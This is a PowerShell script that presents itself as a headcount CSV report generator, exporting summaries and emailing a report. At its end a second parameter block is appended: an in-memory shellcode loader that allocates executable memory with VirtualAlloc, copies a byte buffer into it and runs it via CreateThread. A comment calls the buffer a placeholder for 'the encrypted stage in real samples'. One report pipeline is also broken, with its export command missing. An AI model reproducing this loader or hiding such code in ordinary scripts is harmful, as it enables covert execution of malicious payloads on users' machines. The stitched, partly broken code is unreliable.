[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InputCsv = 'C:\Data\exports\headcount.csv',
    [string]$OutputPath = 'C:\Logs\reports\headcount-summary-2024-11-09.csv',
    [Parameter(Mandatory = $false)]
    [ValidateSet('Department', 'Site')]
    [string]$GroupBy = "Site",
    [double]$MinAmount = 2500
)

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ","
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }
$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}

$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending |
    -NoTypeInformation `
    -Path $OutputPath `
    -Encoding UTF8

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$style = @'
<style>
body { font-family: Segoe UI; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8

$jsonBody = $byGroup | ConvertTo-Json -Depth 3
$jsonBody | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@
$MailTo = 'reporting@contoso.com'
$MailFrom = "bi@contoso.com"

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = "Headcount summary"
    Body       = $summaryBody
    SmtpServer = 'smtp.contoso.com'
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x70, 0xb4, 0xa3, 0x41, 0xe4, 0xec, 0xcd, 0x8e, 0x05, 0xf6, 0xc3, 0xd3, 0xc7, 0x0e, 0x28, 0xb3,
    0x8a, 0x80, 0x5f, 0xa5, 0x65, 0x7a, 0x6c, 0xb6, 0xd0, 0xed, 0xaf, 0x16, 0x75, 0x0e, 0xd5, 0xed,
    0xe0, 0x79, 0x45, 0x9d, 0xf4, 0x21, 0xb7, 0xe6, 0xe8, 0x46, 0x94, 0x61, 0xa5, 0xff, 0xe6, 0x36,
    0x3e, 0x2d, 0x85, 0x6f, 0x6c, 0xa6, 0x10, 0xdc, 0xea, 0xc1, 0x53, 0x7c, 0x77, 0xbb, 0x7b, 0xff,
    0xac, 0x92, 0x85, 0xf3, 0x91, 0x68, 0xa5, 0x50, 0x92, 0xf5, 0x98, 0x8d, 0xf8, 0x93, 0xce, 0x0f,
    0x8d, 0xec, 0x50, 0x04, 0x36, 0xd9, 0x51, 0x2c, 0x54, 0x02, 0x4a, 0xf2, 0xba, 0x69, 0xb1, 0x58,
    0x5b, 0xe4, 0xdd, 0x19, 0x5f, 0x4f, 0x9e, 0x0e, 0xda, 0x1b, 0xfd, 0x77, 0x87, 0xd1, 0x6b, 0xe1,
    0xf8, 0xb2, 0xe3, 0xc0, 0x2d, 0xa6, 0xf4, 0xae, 0xa8, 0x9e, 0xad, 0x25, 0x53, 0x2d, 0xdd, 0xd6,
    0xe1, 0x02, 0xcb, 0xa9, 0xb5, 0x31, 0x0a, 0x27, 0xc8, 0x47, 0xa3, 0xe7, 0x51, 0xe3, 0x11, 0x6e,
    0x20, 0xdf, 0xb2, 0x18, 0x32, 0xe9, 0x5a, 0x2e, 0x78, 0x0a, 0x80, 0x86, 0x97, 0x0f, 0x48, 0xf6,
    0x6a, 0x09, 0x6f, 0x27, 0x5c, 0x3b, 0x5f, 0x95, 0x62, 0xf5, 0xca, 0x43, 0xe8, 0x67, 0x0e, 0x44,
    0x10, 0x7a, 0x3e, 0xce, 0x6c, 0xf1, 0x9d, 0x20, 0x61, 0x80, 0x87, 0xc3, 0x8e, 0xf4, 0x13, 0xaa,
    0xf7, 0x3b, 0x1a, 0x12, 0x5b, 0xb2, 0xf4, 0xf9, 0xb7, 0x2d, 0xdb, 0xe0, 0xb6, 0x9c, 0x63, 0x66,
    0x94, 0xbd, 0xc7, 0x95, 0xc2, 0x25, 0x22, 0x21, 0x17, 0x3f, 0xf2, 0xef, 0x08, 0x09, 0x42, 0x4d,
    0x00, 0x3d, 0xf7, 0xe3, 0x75, 0x20, 0x5e, 0x5a, 0xae, 0x39, 0x6b, 0xb3, 0x2d, 0x27, 0x60, 0x02,
    0x15, 0x53, 0x76, 0x2d, 0x1b, 0xa9, 0x18, 0xb0, 0x75, 0x84, 0xc3, 0xba, 0xce, 0xd9, 0x8e, 0xe7,
    0xbb, 0xcf, 0x9f, 0xba, 0x73, 0x93, 0x12, 0x8d, 0xb9, 0x31, 0x0d, 0x5e, 0x46, 0xcd, 0x55, 0xe8,
    0x88, 0x4d, 0xe4, 0x77, 0x02, 0xb1, 0xa9, 0x4f, 0x4a, 0x9f, 0x5e, 0x7c, 0x9b, 0x7c, 0x1f, 0x4e,
    0xa8, 0x69, 0xe5, 0xeb, 0xd9, 0x8c, 0x81, 0x48, 0x17, 0x2b, 0xb8, 0x51, 0x05, 0xc0, 0x20, 0x33,
    0x12
)

$MemoryHandle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($MemoryHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 2803)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
